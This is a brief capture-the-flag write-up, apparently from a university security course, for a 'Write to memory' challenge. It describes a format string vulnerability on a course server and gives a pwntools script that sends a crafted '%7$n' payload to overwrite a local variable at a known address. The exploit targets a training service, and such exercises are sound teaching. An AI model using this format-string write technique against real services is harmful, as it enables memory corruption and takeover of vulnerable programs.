# Challenge `Write to memory` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23193
- Impact:
  - Allows user to alter local variable

## Steps to reproduce

1. Using `gdb` we can verify that `target` is stored in memory address `0x804c040`
2. We can modify the previous string in order to write to that address

The code used was the following:

```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23193, timeout=100)
s.sendline(b"\x40\xc0\x04\x08%7$n")
print(s.recvall())
```